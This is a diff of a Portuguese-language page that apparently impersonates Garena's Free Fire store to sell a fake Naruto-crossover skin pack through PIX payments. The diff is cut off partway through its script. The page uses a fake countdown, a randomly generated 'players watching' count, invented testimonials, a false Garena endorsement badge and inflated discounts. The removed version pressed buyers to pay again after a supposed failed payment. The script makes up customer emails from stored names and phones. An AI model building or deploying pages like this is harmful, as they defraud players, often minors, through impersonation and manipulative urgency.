@@ -1,414 +1,203 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-    <title>Pagamento Pendente - Free Fire</title>
-    <link rel="icon" href="images/iconff.png" type="image/png">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-    :root{--c-primary:#FF6B00;--c-accent:#7C3AED;--c-bg:#08050F;}
-    *{box-sizing:border-box;margin:0;padding:0;}
-    body{font-family:'Poppins',sans-serif;background:var(--c-bg);color:#fff;min-height:100vh;}
-    a{color:inherit;text-decoration:none;}
-    img{max-width:100%;display:block;}
-    button{cursor:pointer;font-family:inherit;}
-
-    /* Ambient orbs */
-    .ambient-bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none;}
-    .ambient-bg::before,.ambient-bg::after{content:'';position:absolute;width:55vmax;height:55vmax;border-radius:50%;filter:blur(90px);opacity:.25;}
-    .ambient-bg::before{background:radial-gradient(circle,#FF6B00,transparent 60%);top:-15vmax;left:-10vmax;animation:orbA 18s ease-in-out infinite;}
-    .ambient-bg::after{background:radial-gradient(circle,#7C3AED,transparent 60%);bottom:-18vmax;right:-12vmax;animation:orbB 22s ease-in-out infinite;}
-    @keyframes orbA{0%,100%{transform:translate(0,0)}50%{transform:translate(6vmax,4vmax)}}
-    @keyframes orbB{0%,100%{transform:translate(0,0)}50%{transform:translate(-5vmax,-4vmax)}}
-
-    .rp-wrap{max-width:480px;margin:0 auto;padding:0 16px 60px;position:relative;z-index:1;}
-
-    /* Header */
-    .rp-hdr{display:flex;align-items:center;gap:10px;padding:16px 0;border-bottom:1px solid rgba(255,107,0,0.2);}
-    .rp-hdr img{width:36px;height:36px;border-radius:8px;}
-    .rp-hdr-txt{font-size:13px;font-weight:600;color:rgba(255,255,255,0.7);}
-    .rp-hdr-badge{margin-left:auto;font-size:10px;font-weight:700;background:linear-gradient(135deg,#FF6B00,#7C3AED);padding:3px 10px;border-radius:999px;color:#fff;letter-spacing:.08em;}
-
-    /* Alert Banner */
-    .rp-alert{margin-top:20px;background:linear-gradient(135deg,rgba(255,107,0,0.12),rgba(124,58,237,0.08));border:1px solid rgba(255,107,0,0.35);border-radius:16px;padding:20px;text-align:center;}
-    .rp-alert-icon{font-size:40px;margin-bottom:10px;}
-    .rp-alert-title{font-size:18px;font-weight:900;color:#FF6B00;text-transform:uppercase;letter-spacing:0.5px;font-family:'Orbitron',sans-serif;}
-    .rp-alert-desc{font-size:13px;color:rgba(255,255,255,0.7);margin-top:10px;line-height:1.6;}
-    .rp-alert-ok{font-size:13px;color:#FFD700;font-weight:700;margin-top:8px;}
-
-    /* Offer Card */
-    .rp-offer{margin-top:20px;background:linear-gradient(145deg,rgba(20,10,40,.9),rgba(8,5,15,.95));border:1px solid rgba(255,107,0,0.35);border-radius:16px;padding:24px 20px;text-align:center;position:relative;overflow:hidden;box-shadow:0 0 40px rgba(255,107,0,0.1);}
-    .rp-offer::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent,rgba(255,107,0,0.04),transparent,rgba(124,58,237,0.04));animation:offerSpin 8s linear infinite;}
-    @keyframes offerSpin{to{transform:rotate(360deg);}}
-    .rp-offer-inner{position:relative;z-index:1;}
-    .rp-offer-row{font-size:18px;font-weight:700;margin:6px 0;display:flex;align-items:center;justify-content:center;gap:6px;}
-    .rp-offer-row.diamonds{font-size:24px;font-weight:900;color:#FF6B00;}
-    .rp-offer-row.bonus{color:#FFD700;}
-    .rp-offer-row.discount{color:#A78BFA;}
-    .rp-offer-price{font-size:28px;font-weight:900;margin-top:12px;color:#fff;font-family:'Orbitron',sans-serif;}
-    .rp-offer-price small{font-size:12px;font-weight:500;color:rgba(255,255,255,0.5);display:block;margin-bottom:4px;letter-spacing:.1em;}
-
-    /* Info Block */
-    .rp-info{margin-top:16px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,107,0,0.15);border-radius:14px;padding:16px;}
-    .rp-info-title{font-size:14px;font-weight:700;margin-bottom:8px;color:#FF8C00;}
-    .rp-info-text{font-size:13px;color:rgba(255,255,255,0.6);line-height:1.7;}
-
-    /* CTA Button */
-    .rp-cta{margin-top:24px;}
-    .rp-cta-btn{display:block;width:100%;padding:18px;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;text-transform:uppercase;letter-spacing:1px;transition:all .25s;box-shadow:0 8px 30px rgba(255,107,0,0.4);font-family:'Orbitron',sans-serif;position:relative;overflow:hidden;}
-    .rp-cta-btn::after{content:'';position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.35),transparent);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
-    @keyframes shine{0%{left:-120%}55%,100%{left:160%}}
-    .rp-cta-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,107,0,0.6);}
-    .rp-cta-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;}
-
-    /* PIX Result */
-    .rp-pix{display:none;margin-top:24px;text-align:center;}
-    .rp-pix.active{display:block;}
-    .rp-pix-success{background:linear-gradient(135deg,rgba(255,107,0,0.1),rgba(124,58,237,0.1));border:1px solid rgba(255,107,0,0.3);border-radius:14px;padding:16px;margin-bottom:16px;}
-    .rp-pix-success-title{font-size:18px;font-weight:800;color:#FF6B00;font-family:'Orbitron',sans-serif;}
-    .rp-pix-success-sub{font-size:13px;color:rgba(255,255,255,0.6);margin-top:6px;}
-    .rp-pix-summary{font-size:14px;font-weight:600;color:rgba(255,255,255,0.8);margin:12px 0;}
-    .rp-pix-label{font-size:12px;font-weight:700;margin:16px 0 8px;color:rgba(255,255,255,0.4);text-transform:uppercase;letter-spacing:1px;}
-    .rp-qr{background:#fff;border-radius:12px;padding:12px;display:inline-block;margin:8px auto;box-shadow:0 0 30px rgba(255,107,0,0.2);}
-    .rp-qr img{width:220px;height:220px;}
-    .rp-copy-btn{display:block;width:100%;padding:16px;background:rgba(255,107,0,0.1);border:2px solid #FF6B00;color:#FF6B00;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:12px;transition:all .2s;}
-    .rp-copy-btn:hover{background:rgba(255,107,0,0.2);}
-
-    /* Status */
-    .rp-status{margin-top:16px;padding:14px;border-radius:12px;font-size:14px;font-weight:600;text-align:center;}
-    .rp-status.pending{background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.2);color:#FF8C00;}
-    .rp-status.paid{background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);color:#22c55e;}
-    .rp-status.expired{background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);color:#ef4444;}
-
-    /* Loading */
-    .rp-loading{display:none;text-align:center;padding:40px 20px;}
-    .rp-loading.active{display:block;}
-    .rp-spinner{width:40px;height:40px;border:3px solid rgba(255,107,0,0.2);border-top-color:#FF6B00;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 12px;}
-    @keyframes spin{to{transform:rotate(360deg);}}
-    .rp-loading-text{font-size:14px;color:rgba(255,255,255,0.5);}
-
-    /* Error */
-    .rp-error{display:none;margin-top:20px;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.2);border-radius:14px;padding:20px;text-align:center;}
-    .rp-error.active{display:block;}
-    .rp-error-title{font-size:16px;font-weight:700;color:#ef4444;}
-    .rp-error-text{font-size:13px;color:rgba(255,255,255,0.5);margin-top:8px;}
-
-    .rp-footer{margin-top:40px;text-align:center;font-size:11px;color:rgba(255,255,255,0.15);padding-bottom:20px;}
-    </style>
-    <!-- Lowtrack Pixel -->
-    <script>
-      window.pixelId = "lt_px_749f016fa042";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://lowtrack.com.br/pixel.js");
-      document.head.appendChild(a);
-    </script>
-    <!-- UTM Persist -->
-    <script>(function(){var p=new URLSearchParams(window.location.search);['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'].forEach(function(k){var v=p.get(k);if(v){sessionStorage.setItem(k,v);localStorage.setItem(k,v);}});})();</script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+<title>Oferta Especial - Pack Naruto FF</title>
+<link rel="icon" href="images/iconff.png" type="image/png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--p:#FF6B00;--a:#7C3AED;--bg:#08050F;}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{background:var(--bg);color:#fff;font-family:'Poppins',sans-serif;min-height:100vh;}
+img{max-width:100%;display:block;}
+button{cursor:pointer;font-family:inherit;}
+.amb{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none;}
+.amb::before,.amb::after{content:'';position:absolute;width:60vmax;height:60vmax;border-radius:50%;filter:blur(100px);opacity:.18;}
+.amb::before{background:radial-gradient(circle,#FF6B00,transparent 60%);top:-20vmax;left:-15vmax;animation:oA 20s ease-in-out infinite;}
+.amb::after{background:radial-gradient(circle,#7C3AED,transparent 60%);bottom:-20vmax;right:-15vmax;animation:oB 25s ease-in-out infinite;}
+@keyframes oA{0%,100%{transform:translate(0,0)}50%{transform:translate(8vmax,5vmax)}}
+@keyframes oB{0%,100%{transform:translate(0,0)}50%{transform:translate(-6vmax,-5vmax)}}
+.tbar{background:linear-gradient(90deg,#b91c1c,#D81A0D);color:#fff;text-align:center;padding:9px 12px;font-size:11.5px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;position:sticky;top:0;z-index:100;flex-wrap:wrap;}
+.tbar-cd{font-family:monospace;font-size:13px;font-weight:900;background:rgba(0,0,0,.3);border-radius:4px;padding:2px 6px;letter-spacing:2px;}
+.pw{max-width:480px;margin:0 auto;padding:0 0 60px;position:relative;z-index:1;}
+.hero{position:relative;overflow:hidden;}
+.hero img{width:100%;display:block;}
+.hero::after{content:'';position:absolute;bottom:0;left:0;right:0;height:70px;background:linear-gradient(to bottom,transparent,var(--bg));}
+.lbar{background:rgba(255,107,0,.06);border-bottom:1px solid rgba(255,107,0,.15);padding:7px 16px;display:flex;align-items:center;justify-content:center;gap:6px;font-size:.68rem;color:rgba(255,140,0,.9);font-weight:600;}
+.ldot{width:6px;height:6px;border-radius:50%;background:#D81A0D;animation:lb 1s ease-in-out infinite;flex-shrink:0;}
+@keyframes lb{0%,100%{opacity:1;}50%{opacity:.1;}}
+.oh{text-align:center;padding:18px 20px 0;}
+.obadge{display:inline-flex;align-items:center;gap:5px;background:linear-gradient(135deg,rgba(255,107,0,.18),rgba(124,58,237,.18));border:1px solid rgba(255,107,0,.45);border-radius:999px;padding:.35rem 1.1rem;font-size:.68rem;letter-spacing:.12em;color:#FFD700;text-transform:uppercase;font-family:'Orbitron',sans-serif;margin-bottom:10px;}
+.otitle{font-family:'Orbitron',sans-serif;font-size:1.45rem;font-weight:900;background:linear-gradient(135deg,#FF6B00,#FFD700 50%,#FF6B00);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;line-height:1.2;margin-bottom:8px;}
+.osub{font-size:.85rem;color:rgba(255,255,255,.7);line-height:1.5;padding:0 8px;}
+.pbox{margin:18px 16px;background:linear-gradient(145deg,rgba(20,10,40,.95),rgba(8,5,15,1));border:1px solid rgba(255,107,0,.4);border-radius:18px;padding:20px;text-align:center;box-shadow:0 0 40px rgba(255,107,0,.1);}
+.pold{font-size:.82rem;color:rgba(255,255,255,.38);text-decoration:line-through;margin-bottom:4px;}
+.pnew{font-family:'Orbitron',sans-serif;font-size:2.1rem;font-weight:900;color:#fff;line-height:1;}
+.pnew span{font-size:.95rem;font-weight:400;color:rgba(255,255,255,.55);}
+.ptag{display:inline-block;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;font-size:.68rem;font-weight:800;padding:3px 10px;border-radius:999px;letter-spacing:.08em;margin-top:8px;}
+.pdesc{font-size:.72rem;color:rgba(255,255,255,.45);margin-top:8px;line-height:1.5;}
+.ssec{padding:0 16px;margin-top:22px;}
+.slabel{font-family:'Orbitron',sans-serif;font-size:.72rem;letter-spacing:.15em;text-transform:uppercase;color:rgba(255,255,255,.38);margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+.slabel::before,.slabel::after{content:'';flex:1;height:1px;background:rgba(255,255,255,.09);}
+.sgrid{display:grid;grid-template-columns:1fr 1fr;gap:9px;}
+.scard{background:linear-gradient(145deg,rgba(20,10,40,.9),rgba(8,5,15,.95));border:1px solid rgba(255,107,0,.22);border-radius:13px;overflow:hidden;transition:border-color .25s,box-shadow .25s;}
+.scard:hover{border-color:rgba(255,107,0,.55);box-shadow:0 0 18px rgba(255,107,0,.18);}
+.scard img{width:100%;aspect-ratio:1/1;object-fit:cover;}
+.si{padding:7px 9px 9px;}
+.sn{font-family:'Orbitron',sans-serif;font-size:.6rem;font-weight:700;color:#fff;line-height:1.3;margin-bottom:2px;}
+.st{font-size:.56rem;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.07em;}
+.sb{display:inline-block;font-size:.53rem;font-weight:700;padding:2px 5px;border-radius:4px;margin-top:3px;}
+.sb.rare{background:rgba(124,58,237,.28);color:#A78BFA;border:1px solid rgba(124,58,237,.38);}
+.sb.ultra{background:rgba(255,107,0,.28);color:#FF8C00;border:1px solid rgba(255,107,0,.38);}
+.sb.new{background:rgba(34,197,94,.28);color:#4ade80;border:1px solid rgba(34,197,94,.38);}
+.ilist{padding:0 16px;margin-top:18px;display:flex;flex-direction:column;gap:7px;}
+.irow{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,.03);border:1px solid rgba(255,107,0,.11);border-radius:9px;padding:9px 11px;}
+.ii{font-size:1.25rem;flex-shrink:0;}
+.it{font-size:.78rem;color:rgba(255,255,255,.78);line-height:1.4;}
+.it strong{color:#FFD700;}
+.tlist{padding:0 16px;margin-top:14px;display:flex;flex-direction:column;gap:9px;}
+.tc{background:#fff;border-radius:11px;padding:11px;}
+.th{display:flex;align-items:center;gap:7px;margin-bottom:5px;}
+.ta{width:34px;height:34px;border-radius:50%;object-fit:cover;flex-shrink:0;}
+.tn{font-size:.78rem;font-weight:700;color:#111;}
+.ts{color:#f59e0b;font-size:.72rem;}
+.tt{font-size:.73rem;color:#374151;line-height:1.5;}
+.csec{padding:18px 16px 0;}
+.cbtn{display:block;width:100%;padding:17px;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;border:none;border-radius:13px;font-size:.95rem;font-weight:800;text-transform:uppercase;letter-spacing:.06em;box-shadow:0 8px 28px rgba(255,107,0,.48);font-family:'Orbitron',sans-serif;position:relative;overflow:hidden;animation:cp 2.5s ease-in-out infinite;transition:box-shadow .25s;}
+.cbtn::after{content:'';position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.38),transparent);transform:skewX(-20deg);animation:sh 3s ease-in-out infinite;}
+@keyframes sh{0%{left:-120%}55%,100%{left:160%}}
+@keyframes cp{0%,100%{transform:scale(1);}50%{transform:scale(1.018);}}
+.cbtn:hover{box-shadow:0 12px 36px rgba(255,107,0,.65);}
+.cbtn:disabled{opacity:.58;cursor:not-allowed;animation:none;transform:none;}
+.csub{text-align:center;font-size:.68rem;color:rgba(255,255,255,.38);margin-top:7px;}
+.skip{display:block;text-align:center;margin-top:11px;font-size:.68rem;color:rgba(255,255,255,.18);cursor:pointer;text-decoration:underline;}
+.skip:hover{color:rgba(255,255,255,.4);}
+.parea{display:none;margin-top:18px;padding:0 16px;}
+.parea.active{display:block;}
+.psuc{background:linear-gradient(135deg,rgba(255,107,0,.09),rgba(124,58,237,.09));border:1px solid rgba(255,107,0,.28);border-radius:13px;padding:14px;text-align:center;margin-bottom:14px;}
+.psuc-t{font-size:.95rem;font-weight:800;color:#FF6B00;font-family:'Orbitron',sans-serif;}
+.psuc-s{font-size:.72rem;color:rgba(255,255,255,.55);margin-top:3px;}
+.pqr{background:#fff;border-radius:11px;padding:11px;display:inline-block;margin:10px auto;box-shadow:0 0 28px rgba(255,107,0,.18);}
+.pqr img{width:200px;height:200px;}
+.pcode{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);border-radius:7px;padding:10px;margin:0 0 10px;word-break:break-all;font-size:.62rem;color:rgba(255,255,255,.55);line-height:1.5;text-align:left;max-height:72px;overflow-y:auto;}
+.pcopy{display:block;width:100%;padding:13px;background:rgba(255,107,0,.09);border:2px solid #FF6B00;color:#FF6B00;border-radius:9px;font-size:.88rem;font-weight:700;transition:all .2s;}
+.pcopy:hover{background:rgba(255,107,0,.18);}
+.pcopy.copied{background:rgba(34,197,94,.18);border-color:#22c55e;color:#22c55e;}
+.pst{margin-top:10px;padding:11px;border-radius:9px;font-size:.78rem;font-weight:600;text-align:center;}
+.pst.pending{background:rgba(255,107,0,.07);border:1px solid rgba(255,107,0,.18);color:#FF8C00;}
+.pst.paid{background:rgba(34,197,94,.09);border:1px solid rgba(34,197,94,.28);color:#22c55e;}
+.trsec{padding:14px 16px 0;text-align:center;}
+.trbadges{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:10px;flex-wrap:wrap;}
+.trb{display:flex;align-items:center;gap:4px;font-size:.62rem;font-weight:600;}
+.trb.g{color:#16a34a;}.trb.b{color:#2563eb;}
+</style>
+<script>
+window.pixelId="lt_px_749f016fa042";
+var a=document.createElement("script");a.setAttribute("async","");a.setAttribute("defer","");a.setAttribute("src","https://lowtrack.com.br/pixel.js");document.head.appendChild(a);
+</script>
+<script>(function(){var p=new URLSearchParams(window.location.search);['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'].forEach(function(k){var v=p.get(k);if(v){sessionStorage.setItem(k,v);localStorage.setItem(k,v);}});})();</script>
 </head>
 <body>
-<div class="ambient-bg" aria-hidden="true"></div>
-<div class="rp-wrap">
-    <!-- Header -->
-    <div class="rp-hdr">
-        <img src="images/iconff.png" alt="FF">
-        <span class="rp-hdr-txt">Centro de Recarga · Free Fire</span>
-        <span class="rp-hdr-badge">🍃 FF × NARUTO</span>
-    </div>
-
-    <!-- Loading State -->
-    <div class="rp-loading active" id="rp-loading">
-        <div class="rp-spinner"></div>
-        <div class="rp-loading-text">Recuperando dados do pedido...</div>
-    </div>
-
-    <!-- Error State -->
-    <div class="rp-error" id="rp-error">
-        <div class="rp-error-title">❌ Nenhuma tentativa encontrada</div>
-        <div class="rp-error-text" id="rp-error-msg">Você precisa iniciar um pedido na loja para visualizar esta página.</div>
-        <a href="loja.html" style="display:inline-block;margin-top:16px;padding:12px 24px;background:#00B89C;color:#fff;text-decoration:none;border-radius:10px;font-weight:700;font-size:14px;">🛒 VOLTAR À LOJA</a>
-    </div>
-
-    <!-- Main Content (hidden until data loaded) -->
-    <div id="rp-main" style="display:none;">
-        <!-- Alert -->
-        <div class="rp-alert">
-            <div class="rp-alert-icon">⚡</div>
-            <div class="rp-alert-title">SEU JUTSU FALHOU — PIX NÃO CONFIRMADO</div>
-            <div class="rp-alert-desc">Sua missão ainda não foi concluída, ninja. Houve uma instabilidade momentânea na confirmação do pagamento.</div>
-            <div class="rp-alert-ok">🍃 Sua oferta continua reservada. Complete agora! 💎</div>
-        </div>
-
-        <!-- Offer Card -->
-        <div class="rp-offer">
-            <div class="rp-offer-inner">
-                <div class="rp-offer-row diamonds">💎 <span id="rp-diamonds">---</span> DIAMANTES</div>
-                <div class="rp-offer-row bonus">🎁 + <span id="rp-bonus">---</span> DE BÔNUS</div>
-                <div class="rp-offer-row discount" id="rp-discount-row">🔥 <span id="rp-discount">90%</span> OFF</div>
-                <div class="rp-offer-price">
-                    <small>POR APENAS</small>
-                    R$ <span id="rp-price">--,--</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- Refund Info -->
-        <div class="rp-info">
-            <div class="rp-info-title">💰 O VALOR JÁ SAIU DA SUA CONTA?</div>
-            <div class="rp-info-text">Se o valor da tentativa anterior já tiver sido debitado, ele será reembolsado conforme o processamento da instituição financeira, podendo levar até 24 horas.</div>
-        </div>
-
-        <!-- Urgency -->
-        <div class="rp-info" style="margin-top:12px;">
-            <div class="rp-info-title">🔄 NÃO PERCA SUA OFERTA</div>
-            <div class="rp-info-text">Seu pagamento anterior não foi confirmado.<br><br>Para garantir a mesma oferta, o mesmo bônus e o mesmo desconto, gere agora um novo PIX referente à sua tentativa.</div>
-        </div>
-
-        <!-- CTA -->
-        <div class="rp-cta" id="rp-cta-area">
-            <button class="rp-cta-btn" id="rp-retry-btn" onclick="retryPix()">🍃 COMPLETAR MISSÃO — GERAR PIX</button>
-        </div>
-
-        <!-- PIX Result -->
-        <div class="rp-pix" id="rp-pix-area">
-            <div class="rp-pix-success">
-                <div class="rp-pix-success-title">✅ NOVO PIX GERADO!</div>
-                <div class="rp-pix-success-sub">Seu novo QR Code foi criado com os dados da sua tentativa anterior.</div>
-            </div>
-            <div class="rp-pix-summary" id="rp-pix-summary"></div>
-            <div class="rp-pix-label">📱 PAGUE PELO PIX</div>
-            <div class="rp-qr"><img id="rp-qr-img" src="" alt="QR Code PIX"></div>
-            <button class="rp-copy-btn" onclick="copyPix()">📋 COPIAR CÓDIGO PIX</button>
-            <div class="rp-status pending" id="rp-pay-status">⏳ Aguardando confirmação do PIX...</div>
-        </div>
-    </div>
-
-    <div class="rp-footer">
-        <img src="images/garena-logo-full.png" alt="Garena" style="height:20px;margin:0 auto 8px;opacity:0.3;">
-        © Garena Online. Todos os direitos reservados.
-    </div>
+<div class="amb" aria-hidden="true"></div>
+<div class="tbar"><span>OFERTA EXPIRA EM:</span><span class="tbar-cd" id="up-cd">09:59</span><span>Exclusivo pos-evento!</span></div>
+<div class="pw">
+<div class="hero"><img src="https://i.imgur.com/Q7S2v2x.jpg" alt="Free Fire x Naruto Shippuden"></div>
+<div class="lbar"><div class="ldot"></div><span><strong id="up-live">38</strong> jogadores vendo essa oferta agora</span></div>
+<div class="oh">
+<div class="obadge">Oferta Pos-Evento - Exclusivo</div>
+<div class="otitle">PACK NINJA<br>COMPLETO</div>
+<p class="osub">Voce completou o evento. Como recompensa, desbloqueamos o <strong style="color:#FFD700;">Pack Ninja Exclusivo</strong> com as skins mais raras do crossover FF x Naruto Shippuden.</p>
 </div>
-
+<div class="pbox">
+<div class="pold">De R$ 189,00</div>
+<div class="pnew"><span>R$ </span>27<span>,00</span></div>
+<div class="ptag">85% OFF - VALIDO SO AGORA</div>
+<div class="pdesc">Acesso imediato via PIX - Itens creditados em ate 2 min</div>
+</div>
+<div class="ssec">
+<div class="slabel">O que esta incluso</div>
+<div class="sgrid">
+<div class="scard"><img src="https://i.imgur.com/6aEVJcd.jpg" alt="Naruto"><div class="si"><div class="sn">Naruto Uzumaki Bundle</div><div class="st">Modo Sennin</div><span class="sb ultra">ULTRA RARO</span></div></div>
+<div class="scard"><img src="https://i.imgur.com/Q7S2v2x.jpg" alt="Sasuke"><div class="si"><div class="sn">Sasuke Uchiha Bundle</div><div class="st">Sharingan</div><span class="sb rare">RARO</span></div></div>
+<div class="scard"><img src="https://i.imgur.com/6aEVJcd.jpg" alt="Itachi"><div class="si"><div class="sn">Itachi Uchiha Bundle</div><div class="st">Akatsuki</div><span class="sb ultra">ULTRA RARO</span></div></div>
+<div class="scard"><img src="https://i.imgur.com/Q7S2v2x.jpg" alt="Hinata"><div class="si"><div class="sn">Hinata Hyuga Bundle</div><div class="st">Set. 2026</div><span class="sb new">NOVIDADE</span></div></div>
+</div>
+</div>
+<div class="ilist">
+<div class="irow"><div class="ii">&#127811;</div><div class="it"><strong>Faixa da Aldeia da Folha</strong> - Headband do Naruto</div></div>
+<div class="irow"><div class="ii">&#9889;</div><div class="it"><strong>Super Emote Ninja</strong> - Emote exclusivo da collab</div></div>
+<div class="irow"><div class="ii">&#129418;</div><div class="it"><strong>Skywing Nove Caudas</strong> - Asa de planador tematica</div></div>
+<div class="irow"><div class="ii">&#128142;</div><div class="it"><strong>500 Diamantes de bonus</strong> - Luck Royale Naruto</div></div>
+</div>
+<div class="ssec" style="margin-top:22px;"><div class="slabel">O que estao falando</div></div>
+<div class="tlist">
+<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/auPk57l.jpg" alt="Vitor"><div><div class="tn">Vitor Hugo</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Recebi os itens em menos de 2 minutos. As skins do Naruto ficaram insanas!</div></div>
+<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/QnDLVPh.jpg" alt="Beatriz"><div><div class="tn">Beatriz (Trizinha FF)</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Nunca imaginei pegar o bundle do Itachi tao barato assim, recomendo demais!</div></div>
+<div class="tc"><div class="th"><img class="ta" src="https://i.imgur.com/6AC6pWt.jpg" alt="Rebeca"><div><div class="tn">Rebeca Alves</div><div class="ts">&#9733;&#9733;&#9733;&#9733;&#9733;</div></div></div><div class="tt">Pack completo por menos de 30 reais. Chegou na hora e os itens sao lindos!</div></div>
+</div>
+<div class="csec" id="cta-area">
+<button class="cbtn" id="cta-btn" onclick="gerarPix()">QUERO O PACK - GERAR PIX</button>
+<div class="csub">Pagamento 100% seguro via PIX - Itens em ate 2 minutos</div>
+<div class="skip" onclick="pularOferta()">Nao quero esse desconto exclusivo</div>
+</div>
+<div class="parea" id="pix-area">
+<div class="psuc"><div class="psuc-t">PIX GERADO!</div><div class="psuc-s">Escaneie o QR Code ou copie o codigo abaixo</div></div>
+<div style="text-align:center;"><div class="pqr"><img id="pix-qr-img" src="" alt="QR Code PIX"></div></div>
+<div class="pcode" id="pix-code-box"></div>
+<button class="pcopy" id="pix-copy-btn" onclick="copiarPix()">COPIAR CODIGO PIX</button>
+<div class="pst pending" id="pix-status">Aguardando confirmacao do pagamento...</div>
+</div>
+<div class="trsec" style="margin-top:22px;">
+<div class="trbadges">
+<div class="trb g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>SSL Seguro</div>
+<div class="trb b"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 13l4 4L19 7"/></svg>Homologado Garena</div>
+<div class="trb g"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>Entrega Imediata</div>
+</div>
+<img src="https://i.imgur.com/fJRGk92.jpg" alt="Garantia" style="border-radius:12px;width:100%;margin-top:6px;">
+</div>
+</div>
 <script>
-// ── State ──
-var originalHash = '';
-var newPixCode = '';
-var newTxHash = '';
-var checkInterval = null;
-
-// ── Get UTMs ──
-function getUTMs(){
-    var p = new URLSearchParams(window.location.search);
-    var keys = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src'];
-    var obj = {};
-    keys.forEach(function(k){ obj[k] = p.get(k) || sessionStorage.getItem(k) || localStorage.getItem(k) || ''; });
-    return obj;
+function getUTMs(){var p=new URLSearchParams(window.location.search);var keys=['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'];var obj={};keys.forEach(function(k){obj[k]=p.get(k)||sessionStorage.getItem(k)||localStorage.getItem(k)||'';});return obj;}
+(function(){var D=10*60,k='upDeadline',dl=parseInt(sessionStorage.getItem(k),10);if(!dl||isNaN(dl)||dl<Math.floor(Date.now()/1000)){dl=Math.floor(Date.now()/1000)+D;sessionStorage.setItem(k,dl);}var el=document.getElementById('up-cd');function tick(){var left=dl-Math.floor(Date.now()/1000);if(left<0)left=0;var m=Math.floor(left/60),s=left%60;el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;if(left>0)setTimeout(tick,1000);}tick();})();
+(function(){var el=document.getElementById('up-live');var base=32+Math.floor(Math.random()*15);el.textContent=base;setInterval(function(){base=Math.max(24,Math.min(65,base+(Math.random()<.5?1:-1)));el.textContent=base;},4000);})();
+var pixCode='',txHash='',pollInterval=null;
+function gerarPix(){
+var btn=document.getElementById('cta-btn');btn.disabled=true;btn.textContent='Gerando PIX...';
+var nome=localStorage.getItem('ff_nome')||sessionStorage.getItem('ff_nome')||'Ninja';
+var tel=localStorage.getItem('ff_telefone')||sessionStorage.getItem('ff_telefone')||'11999999999';
+var np=nome.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/[^a-z0-9]/g,'');
+var email=np+(tel.slice(-4)||'0000')+'@gmail.com';
+var utms=getUTMs();
+fetch('/api/create-pix',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:'27.00',nome:nome,email:email,telefone:tel,product_title:'Pack Ninja Completo - FF x Naruto',offer_hash:'w1zdcnwb4c',product_hash:'w1zdcnwb4c',utm_source:utms.utm_source,utm_medium:utms.utm_medium,utm_campaign:utms.utm_campaign,utm_term:utms.utm_term,utm_content:utms.utm_content,src:utms.src})})
+.then(function(r){return r.json();})
+.then(function(data){
+var code=null;
